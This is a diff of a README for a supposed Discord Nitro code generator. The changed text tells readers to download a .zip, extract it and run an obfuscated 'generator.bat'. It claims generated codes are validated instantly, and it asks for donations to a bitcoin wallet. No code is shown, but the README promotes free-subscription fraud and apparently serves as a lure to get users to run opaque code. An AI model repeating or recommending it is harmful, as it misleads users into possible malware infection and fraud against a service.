@@ -15,38 +15,25 @@ A powerful Discord Nitro Generator by nxeeee.
 
 ## Features
 
-- **Easy Setup**: Just download the repository and run "generator.bat."
-- **Feature 2**: Description of the second feature.
-- **Feature 3**: Description of the third feature.
+- **Easy Setup**: Download the repository onto your device, extract it, and run "generator.bat".
+- **Instant Code Validation**: All codes will be validated almost instantly after being generated.
+- **Obfuscated**: You do not have to attempt stealing any code, most of the repository is obfuscated using proper working tools.
 
 ## Usage
 
-1. **Download the Repository**: 
+1. **Download the Repository as .zip**: 
 
-    ```bash
-    git clone https://github.com/nxeeee/nitro-generator-v2.git
-    cd nitro-generator-v2
-    ```
+2. **Extract the .zip**:
 
-2. **Run the Generator**:
-
-    - Double-click on "generator.bat" to run the Discord Nitro Generator.
-
-    ```bash
-    # Add any additional instructions or details
-    ```
-
-3. [Include any other important usage instructions]
+3. **Open generator.bat**
 
 ## Contributing
 
 Contributions are welcome! Here's how you can contribute:
 
-1. Fork the repository
-2. Create a new branch: `git checkout -b feature-name`
-3. Commit your changes: `git commit -m 'Add some feature'`
-4. Push to the branch: `git push origin feature-name`
-5. Submit a pull request
+1. Star the repository!
+2. If you're having issues, head over to [issues](https://github.com/nxeeee/nitro-generator-2.0/issues) and submit your error as well as any information potentially helpful.
+3. Donate. My BTC wallet: `bc1q5zghjs7gg5ep5p8uj2yhmctsjx4vwg6vq5qxqy`
 
 ## License
 
